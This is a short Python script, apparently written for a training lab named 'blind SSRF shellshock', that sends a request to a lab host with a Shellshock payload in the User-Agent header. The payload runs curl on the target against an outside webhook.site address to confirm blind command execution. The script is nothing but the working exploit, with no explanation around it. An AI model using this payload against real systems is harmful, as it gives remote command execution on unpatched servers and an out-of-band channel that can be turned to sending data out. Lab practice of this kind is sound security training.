
import requests

url = "http://laplasrouse3-blind_ssrf_shellshock.labs-is-here.online/preview_post/1"
my_webhook = "https://webhook.site/011a51af-70a0-44fd-b8db-728e59646214"
headers = {
    "User-Agent": f"() {{ :; }}; curl {my_webhook}"
}

r = requests.get(url, headers=headers)
print(r.text)

